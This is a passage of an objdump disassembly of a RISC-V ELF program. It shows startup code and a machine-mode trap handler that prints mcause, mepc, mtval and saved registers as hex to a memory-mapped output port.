
code.elf:     file format elf32-littleriscv


Disassembly of section .text:

00001000 <_start>:
    1000:	0100006f          	j	1010 <_init>

00001004 <_end>:
    1004:	0000006f          	j	1004 <_end>

00001008 <_call_main>:
    1008:	700010ef          	jal	2708 <main>
    100c:	ff9ff06f          	j	1004 <_end>

00001010 <_init>:
    1010:	00000517          	auipc	a0,0x0
    1014:	09850513          	addi	a0,a0,152 # 10a8 <trap_vector>
    1018:	30551073          	csrw	mtvec,a0
    101c:	80020137          	lui	sp,0x80020
    1020:	285000ef          	jal	1aa4 <_load>
    1024:	00000093          	li	ra,0
    1028:	00000113          	li	sp,0
    102c:	00000193          	li	gp,0
    1030:	00000213          	li	tp,0
    1034:	00000293          	li	t0,0
    1038:	00000313          	li	t1,0
    103c:	00000393          	li	t2,0
    1040:	00000413          	li	s0,0
    1044:	00000493          	li	s1,0
    1048:	00000513          	li	a0,0
    104c:	00000593          	li	a1,0
    1050:	00000613          	li	a2,0
    1054:	00000693          	li	a3,0
    1058:	00000713          	li	a4,0
    105c:	00000793          	li	a5,0
    1060:	00000813          	li	a6,0
    1064:	00000893          	li	a7,0
    1068:	00000913          	li	s2,0
    106c:	00000993          	li	s3,0
    1070:	00000a13          	li	s4,0
    1074:	00000a93          	li	s5,0
    1078:	00000b13          	li	s6,0
    107c:	00000b93          	li	s7,0
    1080:	00000c13          	li	s8,0
    1084:	00000c93          	li	s9,0
    1088:	00000d13          	li	s10,0
    108c:	00000d93          	li	s11,0
    1090:	00000e13          	li	t3,0
    1094:	00000e93          	li	t4,0
    1098:	00000f13          	li	t5,0
    109c:	00000f93          	li	t6,0
    10a0:	80020137          	lui	sp,0x80020
    10a4:	f65ff06f          	j	1008 <_call_main>

000010a8 <trap_vector>:
    10a8:	f8010113          	addi	sp,sp,-128 # 8001ff80 <dummyMem+0x1fbe8>
    10ac:	00012023          	sw	zero,0(sp)
    10b0:	00112223          	sw	ra,4(sp)
    10b4:	00212423          	sw	sp,8(sp)
    10b8:	00312623          	sw	gp,12(sp)
    10bc:	00412823          	sw	tp,16(sp)
    10c0:	00512a23          	sw	t0,20(sp)
    10c4:	00612c23          	sw	t1,24(sp)
    10c8:	00712e23          	sw	t2,28(sp)
    10cc:	02812023          	sw	s0,32(sp)
    10d0:	02912223          	sw	s1,36(sp)
    10d4:	02a12423          	sw	a0,40(sp)
    10d8:	02b12623          	sw	a1,44(sp)
    10dc:	02c12823          	sw	a2,48(sp)
    10e0:	02d12a23          	sw	a3,52(sp)
    10e4:	02e12c23          	sw	a4,56(sp)
    10e8:	02f12e23          	sw	a5,60(sp)
    10ec:	05012023          	sw	a6,64(sp)
    10f0:	05112223          	sw	a7,68(sp)
    10f4:	05212423          	sw	s2,72(sp)
    10f8:	05312623          	sw	s3,76(sp)
    10fc:	05412823          	sw	s4,80(sp)
    1100:	05512a23          	sw	s5,84(sp)
    1104:	05612c23          	sw	s6,88(sp)
    1108:	05712e23          	sw	s7,92(sp)
    110c:	07812023          	sw	s8,96(sp)
    1110:	07912223          	sw	s9,100(sp)
    1114:	07a12423          	sw	s10,104(sp)
    1118:	07b12623          	sw	s11,108(sp)
    111c:	07c12823          	sw	t3,112(sp)
    1120:	07d12a23          	sw	t4,116(sp)
    1124:	07e12c23          	sw	t5,120(sp)
    1128:	07f12e23          	sw	t6,124(sp)
    112c:	7ffff517          	auipc	a0,0x7ffff
    1130:	ed450513          	addi	a0,a0,-300 # 80000000 <__data_start>
    1134:	00050293          	mv	t0,a0
    1138:	40002337          	lui	t1,0x40002
    113c:	0002c503          	lbu	a0,0(t0)
    1140:	00128293          	addi	t0,t0,1
    1144:	00050663          	beqz	a0,1150 <trap_vector+0xa8>
    1148:	00a32023          	sw	a0,0(t1) # 40002000 <__rodata_end+0x3ffff4ee>
    114c:	ff1ff06f          	j	113c <trap_vector+0x94>
    1150:	7ffff517          	auipc	a0,0x7ffff
    1154:	ed050513          	addi	a0,a0,-304 # 80000020 <__data_start+0x20>
    1158:	00050293          	mv	t0,a0
    115c:	40002337          	lui	t1,0x40002
    1160:	0002c503          	lbu	a0,0(t0)
    1164:	00128293          	addi	t0,t0,1
    1168:	00050663          	beqz	a0,1174 <trap_vector+0xcc>
    116c:	00a32023          	sw	a0,0(t1) # 40002000 <__rodata_end+0x3ffff4ee>
    1170:	ff1ff06f          	j	1160 <trap_vector+0xb8>
    1174:	34202573          	csrr	a0,mcause
    1178:	7ffff297          	auipc	t0,0x7ffff
    117c:	eb828293          	addi	t0,t0,-328 # 80000030 <__data_start+0x30>
    1180:	0012a023          	sw	ra,0(t0)
    1184:	00a2a223          	sw	a0,4(t0)
    1188:	00b2a423          	sw	a1,8(t0)
    118c:	00050513          	mv	a0,a0
    1190:	00050593          	mv	a1,a0
    1194:	01855513          	srli	a0,a0,0x18
    1198:	00050513          	mv	a0,a0
    119c:	00050313          	mv	t1,a0
    11a0:	00435513          	srli	a0,t1,0x4
    11a4:	00f57513          	andi	a0,a0,15
    11a8:	7ffff297          	auipc	t0,0x7ffff
    11ac:	e9828293          	addi	t0,t0,-360 # 80000040 <__data_start+0x40>
    11b0:	00550533          	add	a0,a0,t0
    11b4:	00054503          	lbu	a0,0(a0)
    11b8:	400022b7          	lui	t0,0x40002
    11bc:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4ee>
    11c0:	00f37513          	andi	a0,t1,15
    11c4:	7ffff297          	auipc	t0,0x7ffff
    11c8:	e7c28293          	addi	t0,t0,-388 # 80000040 <__data_start+0x40>
    11cc:	00550533          	add	a0,a0,t0
    11d0:	00054503          	lbu	a0,0(a0)
    11d4:	400022b7          	lui	t0,0x40002
    11d8:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4ee>
    11dc:	00058513          	mv	a0,a1
    11e0:	01055513          	srli	a0,a0,0x10
    11e4:	00050513          	mv	a0,a0
    11e8:	00050313          	mv	t1,a0
    11ec:	00435513          	srli	a0,t1,0x4
    11f0:	00f57513          	andi	a0,a0,15
    11f4:	7ffff297          	auipc	t0,0x7ffff
    11f8:	e6c28293          	addi	t0,t0,-404 # 80000060 <__data_start+0x60>
    11fc:	00550533          	add	a0,a0,t0
    1200:	00054503          	lbu	a0,0(a0)
    1204:	400022b7          	lui	t0,0x40002
    1208:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4ee>
    120c:	00f37513          	andi	a0,t1,15
    1210:	7ffff297          	auipc	t0,0x7ffff
    1214:	e5028293          	addi	t0,t0,-432 # 80000060 <__data_start+0x60>
    1218:	00550533          	add	a0,a0,t0
    121c:	00054503          	lbu	a0,0(a0)
    1220:	400022b7          	lui	t0,0x40002
    1224:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4ee>
    1228:	00058513          	mv	a0,a1
    122c:	00855513          	srli	a0,a0,0x8
    1230:	00050513          	mv	a0,a0
    1234:	00050313          	mv	t1,a0
    1238:	00435513          	srli	a0,t1,0x4
    123c:	00f57513          	andi	a0,a0,15
    1240:	7ffff297          	auipc	t0,0x7ffff
    1244:	e4028293          	addi	t0,t0,-448 # 80000080 <__data_start+0x80>
    1248:	00550533          	add	a0,a0,t0
    124c:	00054503          	lbu	a0,0(a0)
    1250:	400022b7          	lui	t0,0x40002
    1254:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4ee>
    1258:	00f37513          	andi	a0,t1,15
    125c:	7ffff297          	auipc	t0,0x7ffff
    1260:	e2428293          	addi	t0,t0,-476 # 80000080 <__data_start+0x80>
    1264:	00550533          	add	a0,a0,t0
    1268:	00054503          	lbu	a0,0(a0)
    126c:	400022b7          	lui	t0,0x40002
    1270:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4ee>
    1274:	00058513          	mv	a0,a1
    1278:	00050513          	mv	a0,a0
    127c:	00050313          	mv	t1,a0
    1280:	00435513          	srli	a0,t1,0x4
    1284:	00f57513          	andi	a0,a0,15
    1288:	7ffff297          	auipc	t0,0x7ffff
    128c:	e1828293          	addi	t0,t0,-488 # 800000a0 <__data_start+0xa0>
    1290:	00550533          	add	a0,a0,t0
    1294:	00054503          	lbu	a0,0(a0)
    1298:	400022b7          	lui	t0,0x40002
    129c:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4ee>
    12a0:	00f37513          	andi	a0,t1,15
    12a4:	7ffff297          	auipc	t0,0x7ffff
    12a8:	dfc28293          	addi	t0,t0,-516 # 800000a0 <__data_start+0xa0>
    12ac:	00550533          	add	a0,a0,t0
    12b0:	00054503          	lbu	a0,0(a0)
    12b4:	400022b7          	lui	t0,0x40002
    12b8:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4ee>
    12bc:	7ffff297          	auipc	t0,0x7ffff
    12c0:	de428293          	addi	t0,t0,-540 # 800000a0 <__data_start+0xa0>
    12c4:	0002a083          	lw	ra,0(t0)
    12c8:	0042a503          	lw	a0,4(t0)
    12cc:	0082a583          	lw	a1,8(t0)
    12d0:	7ffff517          	auipc	a0,0x7ffff
    12d4:	df050513          	addi	a0,a0,-528 # 800000c0 <__data_start+0xc0>
    12d8:	00050293          	mv	t0,a0
    12dc:	40002337          	lui	t1,0x40002
    12e0:	0002c503          	lbu	a0,0(t0)
    12e4:	00128293          	addi	t0,t0,1
    12e8:	00050663          	beqz	a0,12f4 <trap_vector+0x24c>
    12ec:	00a32023          	sw	a0,0(t1) # 40002000 <__rodata_end+0x3ffff4ee>
    12f0:	ff1ff06f          	j	12e0 <trap_vector+0x238>
    12f4:	34102573          	csrr	a0,mepc
    12f8:	7ffff297          	auipc	t0,0x7ffff
    12fc:	dd828293          	addi	t0,t0,-552 # 800000d0 <__data_start+0xd0>
    1300:	0012a023          	sw	ra,0(t0)
    1304:	00a2a223          	sw	a0,4(t0)
    1308:	00b2a423          	sw	a1,8(t0)
    130c:	00050513          	mv	a0,a0
    1310:	00050593          	mv	a1,a0
    1314:	01855513          	srli	a0,a0,0x18
    1318:	00050513          	mv	a0,a0
    131c:	00050313          	mv	t1,a0
    1320:	00435513          	srli	a0,t1,0x4
    1324:	00f57513          	andi	a0,a0,15
    1328:	7ffff297          	auipc	t0,0x7ffff
    132c:	db828293          	addi	t0,t0,-584 # 800000e0 <__data_start+0xe0>
    1330:	00550533          	add	a0,a0,t0
    1334:	00054503          	lbu	a0,0(a0)
    1338:	400022b7          	lui	t0,0x40002
    133c:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4ee>
    1340:	00f37513          	andi	a0,t1,15
    1344:	7ffff297          	auipc	t0,0x7ffff
    1348:	d9c28293          	addi	t0,t0,-612 # 800000e0 <__data_start+0xe0>
    134c:	00550533          	add	a0,a0,t0
    1350:	00054503          	lbu	a0,0(a0)
    1354:	400022b7          	lui	t0,0x40002
    1358:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4ee>
    135c:	00058513          	mv	a0,a1
    1360:	01055513          	srli	a0,a0,0x10
    1364:	00050513          	mv	a0,a0
    1368:	00050313          	mv	t1,a0
    136c:	00435513          	srli	a0,t1,0x4
    1370:	00f57513          	andi	a0,a0,15
    1374:	7ffff297          	auipc	t0,0x7ffff
    1378:	d8c28293          	addi	t0,t0,-628 # 80000100 <__data_start+0x100>
    137c:	00550533          	add	a0,a0,t0
    1380:	00054503          	lbu	a0,0(a0)
    1384:	400022b7          	lui	t0,0x40002
    1388:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4ee>
    138c:	00f37513          	andi	a0,t1,15
    1390:	7ffff297          	auipc	t0,0x7ffff
    1394:	d7028293          	addi	t0,t0,-656 # 80000100 <__data_start+0x100>
    1398:	00550533          	add	a0,a0,t0
    139c:	00054503          	lbu	a0,0(a0)
    13a0:	400022b7          	lui	t0,0x40002
    13a4:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4ee>
    13a8:	00058513          	mv	a0,a1
    13ac:	00855513          	srli	a0,a0,0x8
    13b0:	00050513          	mv	a0,a0
    13b4:	00050313          	mv	t1,a0
    13b8:	00435513          	srli	a0,t1,0x4
    13bc:	00f57513          	andi	a0,a0,15
    13c0:	7ffff297          	auipc	t0,0x7ffff
    13c4:	d6028293          	addi	t0,t0,-672 # 80000120 <__data_start+0x120>
    13c8:	00550533          	add	a0,a0,t0
    13cc:	00054503          	lbu	a0,0(a0)
    13d0:	400022b7          	lui	t0,0x40002
    13d4:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4ee>
    13d8:	00f37513          	andi	a0,t1,15
    13dc:	7ffff297          	auipc	t0,0x7ffff
    13e0:	d4428293          	addi	t0,t0,-700 # 80000120 <__data_start+0x120>
    13e4:	00550533          	add	a0,a0,t0
    13e8:	00054503          	lbu	a0,0(a0)
    13ec:	400022b7          	lui	t0,0x40002
    13f0:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4ee>
    13f4:	00058513          	mv	a0,a1
    13f8:	00050513          	mv	a0,a0
    13fc:	00050313          	mv	t1,a0
    1400:	00435513          	srli	a0,t1,0x4
    1404:	00f57513          	andi	a0,a0,15
    1408:	7ffff297          	auipc	t0,0x7ffff
    140c:	d3828293          	addi	t0,t0,-712 # 80000140 <__data_start+0x140>
    1410:	00550533          	add	a0,a0,t0
    1414:	00054503          	lbu	a0,0(a0)
    1418:	400022b7          	lui	t0,0x40002
    141c:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4ee>
    1420:	00f37513          	andi	a0,t1,15
    1424:	7ffff297          	auipc	t0,0x7ffff
    1428:	d1c28293          	addi	t0,t0,-740 # 80000140 <__data_start+0x140>
    142c:	00550533          	add	a0,a0,t0
    1430:	00054503          	lbu	a0,0(a0)
    1434:	400022b7          	lui	t0,0x40002
    1438:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4ee>
    143c:	7ffff297          	auipc	t0,0x7ffff
    1440:	d0428293          	addi	t0,t0,-764 # 80000140 <__data_start+0x140>
    1444:	0002a083          	lw	ra,0(t0)
    1448:	0042a503          	lw	a0,4(t0)
    144c:	0082a583          	lw	a1,8(t0)
    1450:	7ffff517          	auipc	a0,0x7ffff
    1454:	d1050513          	addi	a0,a0,-752 # 80000160 <__data_start+0x160>
    1458:	00050293          	mv	t0,a0
    145c:	40002337          	lui	t1,0x40002
    1460:	0002c503          	lbu	a0,0(t0)
    1464:	00128293          	addi	t0,t0,1
    1468:	00050663          	beqz	a0,1474 <trap_vector+0x3cc>
    146c:	00a32023          	sw	a0,0(t1) # 40002000 <__rodata_end+0x3ffff4ee>
    1470:	ff1ff06f          	j	1460 <trap_vector+0x3b8>
    1474:	34302573          	csrr	a0,mtval
    1478:	7ffff297          	auipc	t0,0x7ffff
    147c:	cf828293          	addi	t0,t0,-776 # 80000170 <__data_start+0x170>
    1480:	0012a023          	sw	ra,0(t0)
    1484:	00a2a223          	sw	a0,4(t0)
    1488:	00b2a423          	sw	a1,8(t0)
    148c:	00050513          	mv	a0,a0
    1490:	00050593          	mv	a1,a0
    1494:	01855513          	srli	a0,a0,0x18
    1498:	00050513          	mv	a0,a0
    149c:	00050313          	mv	t1,a0
    14a0:	00435513          	srli	a0,t1,0x4
    14a4:	00f57513          	andi	a0,a0,15
    14a8:	7ffff297          	auipc	t0,0x7ffff
    14ac:	cd828293          	addi	t0,t0,-808 # 80000180 <__data_start+0x180>
    14b0:	00550533          	add	a0,a0,t0
    14b4:	00054503          	lbu	a0,0(a0)
    14b8:	400022b7          	lui	t0,0x40002
    14bc:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4ee>
    14c0:	00f37513          	andi	a0,t1,15
    14c4:	7ffff297          	auipc	t0,0x7ffff
    14c8:	cbc28293          	addi	t0,t0,-836 # 80000180 <__data_start+0x180>
    14cc:	00550533          	add	a0,a0,t0
    14d0:	00054503          	lbu	a0,0(a0)
    14d4:	400022b7          	lui	t0,0x40002
    14d8:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4ee>
    14dc:	00058513          	mv	a0,a1
    14e0:	01055513          	srli	a0,a0,0x10
    14e4:	00050513          	mv	a0,a0
    14e8:	00050313          	mv	t1,a0
    14ec:	00435513          	srli	a0,t1,0x4
    14f0:	00f57513          	andi	a0,a0,15
    14f4:	7ffff297          	auipc	t0,0x7ffff
    14f8:	cac28293          	addi	t0,t0,-852 # 800001a0 <__data_start+0x1a0>
    14fc:	00550533          	add	a0,a0,t0
    1500:	00054503          	lbu	a0,0(a0)
    1504:	400022b7          	lui	t0,0x40002
    1508:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4ee>
    150c:	00f37513          	andi	a0,t1,15
    1510:	7ffff297          	auipc	t0,0x7ffff
    1514:	c9028293          	addi	t0,t0,-880 # 800001a0 <__data_start+0x1a0>
    1518:	00550533          	add	a0,a0,t0
    151c:	00054503          	lbu	a0,0(a0)
    1520:	400022b7          	lui	t0,0x40002
    1524:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4ee>
    1528:	00058513          	mv	a0,a1
    152c:	00855513          	srli	a0,a0,0x8
    1530:	00050513          	mv	a0,a0
    1534:	00050313          	mv	t1,a0
    1538:	00435513          	srli	a0,t1,0x4
    153c:	00f57513          	andi	a0,a0,15
    1540:	7ffff297          	auipc	t0,0x7ffff
    1544:	c8028293          	addi	t0,t0,-896 # 800001c0 <__data_start+0x1c0>
    1548:	00550533          	add	a0,a0,t0
    154c:	00054503          	lbu	a0,0(a0)
    1550:	400022b7          	lui	t0,0x40002
    1554:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4ee>
    1558:	00f37513          	andi	a0,t1,15
    155c:	7ffff297          	auipc	t0,0x7ffff
    1560:	c6428293          	addi	t0,t0,-924 # 800001c0 <__data_start+0x1c0>
    1564:	00550533          	add	a0,a0,t0
    1568:	00054503          	lbu	a0,0(a0)
    156c:	400022b7          	lui	t0,0x40002
    1570:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4ee>
    1574:	00058513          	mv	a0,a1
    1578:	00050513          	mv	a0,a0
    157c:	00050313          	mv	t1,a0
    1580:	00435513          	srli	a0,t1,0x4
    1584:	00f57513          	andi	a0,a0,15
    1588:	7ffff297          	auipc	t0,0x7ffff
    158c:	c5828293          	addi	t0,t0,-936 # 800001e0 <__data_start+0x1e0>
    1590:	00550533          	add	a0,a0,t0
    1594:	00054503          	lbu	a0,0(a0)
    1598:	400022b7          	lui	t0,0x40002
    159c:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4ee>
    15a0:	00f37513          	andi	a0,t1,15
    15a4:	7ffff297          	auipc	t0,0x7ffff
    15a8:	c3c28293          	addi	t0,t0,-964 # 800001e0 <__data_start+0x1e0>
    15ac:	00550533          	add	a0,a0,t0
    15b0:	00054503          	lbu	a0,0(a0)
    15b4:	400022b7          	lui	t0,0x40002
    15b8:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4ee>
    15bc:	7ffff297          	auipc	t0,0x7ffff
    15c0:	c2428293          	addi	t0,t0,-988 # 800001e0 <__data_start+0x1e0>
    15c4:	0002a083          	lw	ra,0(t0)
    15c8:	0042a503          	lw	a0,4(t0)
    15cc:	0082a583          	lw	a1,8(t0)
    15d0:	7ffff517          	auipc	a0,0x7ffff
    15d4:	c3050513          	addi	a0,a0,-976 # 80000200 <__data_start+0x200>
    15d8:	00050293          	mv	t0,a0
    15dc:	40002337          	lui	t1,0x40002
    15e0:	0002c503          	lbu	a0,0(t0)
    15e4:	00128293          	addi	t0,t0,1
    15e8:	00050663          	beqz	a0,15f4 <trap_vector+0x54c>
    15ec:	00a32023          	sw	a0,0(t1) # 40002000 <__rodata_end+0x3ffff4ee>
    15f0:	ff1ff06f          	j	15e0 <trap_vector+0x538>
    15f4:	00000393          	li	t2,0
    15f8:	08000e13          	li	t3,128

000015fc <trap_dump_registers>:
    15fc:	0023d513          	srli	a0,t2,0x2
    1600:	7ffff297          	auipc	t0,0x7ffff
    1604:	c1028293          	addi	t0,t0,-1008 # 80000210 <__data_start+0x210>
    1608:	0012a023          	sw	ra,0(t0)
    160c:	00a2a223          	sw	a0,4(t0)
    1610:	00b2a423          	sw	a1,8(t0)
    1614:	00050513          	mv	a0,a0
    1618:	00050593          	mv	a1,a0
    161c:	01855513          	srli	a0,a0,0x18
    1620:	00050513          	mv	a0,a0
    1624:	00050313          	mv	t1,a0
    1628:	00435513          	srli	a0,t1,0x4
    162c:	00f57513          	andi	a0,a0,15
    1630:	7ffff297          	auipc	t0,0x7ffff
    1634:	bf028293          	addi	t0,t0,-1040 # 80000220 <__data_start+0x220>
    1638:	00550533          	add	a0,a0,t0
    163c:	00054503          	lbu	a0,0(a0)
    1640:	400022b7          	lui	t0,0x40002
    1644:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4ee>
    1648:	00f37513          	andi	a0,t1,15
    164c:	7ffff297          	auipc	t0,0x7ffff
    1650:	bd428293          	addi	t0,t0,-1068 # 80000220 <__data_start+0x220>
    1654:	00550533          	add	a0,a0,t0
    1658:	00054503          	lbu	a0,0(a0)
    165c:	400022b7          	lui	t0,0x40002
    1660:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4ee>
    1664:	00058513          	mv	a0,a1
    1668:	01055513          	srli	a0,a0,0x10
    166c:	00050513          	mv	a0,a0
    1670:	00050313          	mv	t1,a0
    1674:	00435513          	srli	a0,t1,0x4
    1678:	00f57513          	andi	a0,a0,15
    167c:	7ffff297          	auipc	t0,0x7ffff
    1680:	bc428293          	addi	t0,t0,-1084 # 80000240 <__data_start+0x240>
    1684:	00550533          	add	a0,a0,t0
    1688:	00054503          	lbu	a0,0(a0)
    168c:	400022b7          	lui	t0,0x40002
    1690:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4ee>
    1694:	00f37513          	andi	a0,t1,15
    1698:	7ffff297          	auipc	t0,0x7ffff
    169c:	ba828293          	addi	t0,t0,-1112 # 80000240 <__data_start+0x240>
    16a0:	00550533          	add	a0,a0,t0
    16a4:	00054503          	lbu	a0,0(a0)
    16a8:	400022b7          	lui	t0,0x40002
    16ac:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4ee>
    16b0:	00058513          	mv	a0,a1
    16b4:	00855513          	srli	a0,a0,0x8
    16b8:	00050513          	mv	a0,a0
    16bc:	00050313          	mv	t1,a0
    16c0:	00435513          	srli	a0,t1,0x4
    16c4:	00f57513          	andi	a0,a0,15
    16c8:	7ffff297          	auipc	t0,0x7ffff
    16cc:	b9828293          	addi	t0,t0,-1128 # 80000260 <__data_start+0x260>
    16d0:	00550533          	add	a0,a0,t0
    16d4:	00054503          	lbu	a0,0(a0)
    16d8:	400022b7          	lui	t0,0x40002
    16dc:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4ee>
    16e0:	00f37513          	andi	a0,t1,15
    16e4:	7ffff297          	auipc	t0,0x7ffff
    16e8:	b7c28293          	addi	t0,t0,-1156 # 80000260 <__data_start+0x260>
    16ec:	00550533          	add	a0,a0,t0
    16f0:	00054503          	lbu	a0,0(a0)
    16f4:	400022b7          	lui	t0,0x40002
    16f8:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4ee>
    16fc:	00058513          	mv	a0,a1
    1700:	00050513          	mv	a0,a0
    1704:	00050313          	mv	t1,a0
    1708:	00435513          	srli	a0,t1,0x4
    170c:	00f57513          	andi	a0,a0,15
    1710:	7ffff297          	auipc	t0,0x7ffff
    1714:	b7028293          	addi	t0,t0,-1168 # 80000280 <__data_start+0x280>
    1718:	00550533          	add	a0,a0,t0
    171c:	00054503          	lbu	a0,0(a0)
    1720:	400022b7          	lui	t0,0x40002
    1724:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4ee>
    1728:	00f37513          	andi	a0,t1,15
    172c:	7ffff297          	auipc	t0,0x7ffff
    1730:	b5428293          	addi	t0,t0,-1196 # 80000280 <__data_start+0x280>
    1734:	00550533          	add	a0,a0,t0
    1738:	00054503          	lbu	a0,0(a0)
    173c:	400022b7          	lui	t0,0x40002
    1740:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4ee>
    1744:	7ffff297          	auipc	t0,0x7ffff
    1748:	b3c28293          	addi	t0,t0,-1220 # 80000280 <__data_start+0x280>
    174c:	0002a083          	lw	ra,0(t0)
    1750:	0042a503          	lw	a0,4(t0)
    1754:	0082a583          	lw	a1,8(t0)
    1758:	7ffff517          	auipc	a0,0x7ffff
    175c:	b4850513          	addi	a0,a0,-1208 # 800002a0 <__data_start+0x2a0>
    1760:	00050293          	mv	t0,a0
    1764:	40002337          	lui	t1,0x40002
    1768:	0002c503          	lbu	a0,0(t0)
    176c:	00128293          	addi	t0,t0,1
    1770:	00050663          	beqz	a0,177c <trap_dump_registers+0x180>
    1774:	00a32023          	sw	a0,0(t1) # 40002000 <__rodata_end+0x3ffff4ee>
    1778:	ff1ff06f          	j	1768 <trap_dump_registers+0x16c>
    177c:	00238533          	add	a0,t2,sp
    1780:	00052503          	lw	a0,0(a0)
    1784:	7ffff297          	auipc	t0,0x7ffff
    1788:	b2c28293          	addi	t0,t0,-1236 # 800002b0 <__data_start+0x2b0>
    178c:	0012a023          	sw	ra,0(t0)
    1790:	00a2a223          	sw	a0,4(t0)
    1794:	00b2a423          	sw	a1,8(t0)
    1798:	00050513          	mv	a0,a0
    179c:	00050593          	mv	a1,a0
    17a0:	01855513          	srli	a0,a0,0x18
    17a4:	00050513          	mv	a0,a0
    17a8:	00050313          	mv	t1,a0
    17ac:	00435513          	srli	a0,t1,0x4
    17b0:	00f57513          	andi	a0,a0,15
    17b4:	7ffff297          	auipc	t0,0x7ffff
    17b8:	b0c28293          	addi	t0,t0,-1268 # 800002c0 <__data_start+0x2c0>
    17bc:	00550533          	add	a0,a0,t0
    17c0:	00054503          	lbu	a0,0(a0)
    17c4:	400022b7          	lui	t0,0x40002
    17c8:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4ee>
    17cc:	00f37513          	andi	a0,t1,15
    17d0:	7ffff297          	auipc	t0,0x7ffff
    17d4:	af028293          	addi	t0,t0,-1296 # 800002c0 <__data_start+0x2c0>
    17d8:	00550533          	add	a0,a0,t0
    17dc:	00054503          	lbu	a0,0(a0)
    17e0:	400022b7          	lui	t0,0x40002
    17e4:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4ee>
    17e8:	00058513          	mv	a0,a1
    17ec:	01055513          	srli	a0,a0,0x10
    17f0:	00050513          	mv	a0,a0
    17f4:	00050313          	mv	t1,a0
    17f8:	00435513          	srli	a0,t1,0x4
    17fc:	00f57513          	andi	a0,a0,15
    1800:	7ffff297          	auipc	t0,0x7ffff
    1804:	ae028293          	addi	t0,t0,-1312 # 800002e0 <__data_start+0x2e0>
    1808:	00550533          	add	a0,a0,t0
    180c:	00054503          	lbu	a0,0(a0)
    1810:	400022b7          	lui	t0,0x40002
    1814:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4ee>
    1818:	00f37513          	andi	a0,t1,15
    181c:	7ffff297          	auipc	t0,0x7ffff
    1820:	ac428293          	addi	t0,t0,-1340 # 800002e0 <__data_start+0x2e0>
    1824:	00550533          	add	a0,a0,t0
    1828:	00054503          	lbu	a0,0(a0)
    182c:	400022b7          	lui	t0,0x40002
    1830:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4ee>
    1834:	00058513          	mv	a0,a1
    1838:	00855513          	srli	a0,a0,0x8
    183c:	00050513          	mv	a0,a0
    1840:	00050313          	mv	t1,a0
    1844:	00435513          	srli	a0,t1,0x4
    1848:	00f57513          	andi	a0,a0,15
    184c:	7ffff297          	auipc	t0,0x7ffff
    1850:	ab428293          	addi	t0,t0,-1356 # 80000300 <__data_start+0x300>
    1854:	00550533          	add	a0,a0,t0
    1858:	00054503          	lbu	a0,0(a0)
    185c:	400022b7          	lui	t0,0x40002
    1860:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4ee>
    1864:	00f37513          	andi	a0,t1,15
    1868:	7ffff297          	auipc	t0,0x7ffff
    186c:	a9828293          	addi	t0,t0,-1384 # 80000300 <__data_start+0x300>
    1870:	00550533          	add	a0,a0,t0
    1874:	00054503          	lbu	a0,0(a0)
    1878:	400022b7          	lui	t0,0x40002
    187c:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4ee>
    1880:	00058513          	mv	a0,a1
    1884:	00050513          	mv	a0,a0
    1888:	00050313          	mv	t1,a0
    188c:	00435513          	srli	a0,t1,0x4
    1890:	00f57513          	andi	a0,a0,15
    1894:	7ffff297          	auipc	t0,0x7ffff
    1898:	a8c28293          	addi	t0,t0,-1396 # 80000320 <__data_start+0x320>
    189c:	00550533          	add	a0,a0,t0
    18a0:	00054503          	lbu	a0,0(a0)
    18a4:	400022b7          	lui	t0,0x40002
    18a8:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4ee>
    18ac:	00f37513          	andi	a0,t1,15
    18b0:	7ffff297          	auipc	t0,0x7ffff
    18b4:	a7028293          	addi	t0,t0,-1424 # 80000320 <__data_start+0x320>
    18b8:	00550533          	add	a0,a0,t0
    18bc:	00054503          	lbu	a0,0(a0)
    18c0:	400022b7          	lui	t0,0x40002
